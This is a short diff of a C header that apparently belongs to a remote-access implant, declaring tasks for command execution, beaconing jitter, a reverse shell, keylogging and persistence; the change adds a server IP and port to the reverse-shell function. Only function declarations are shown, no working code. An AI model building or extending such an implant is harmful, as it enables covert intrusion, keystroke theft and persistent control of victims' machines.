@@ -5,7 +5,7 @@
 void task_execve(char *command_str, char *argument_str, const char *id_task);
 void task_sleep(char *sleep_time_str, char *jitter_str);
 void task_locate(const char *id_task);
-void task_revshell();
+void task_revshell(int server_port, const char *server_ip);
 void task_keylog();
 void task_persist();
 void task_cat();
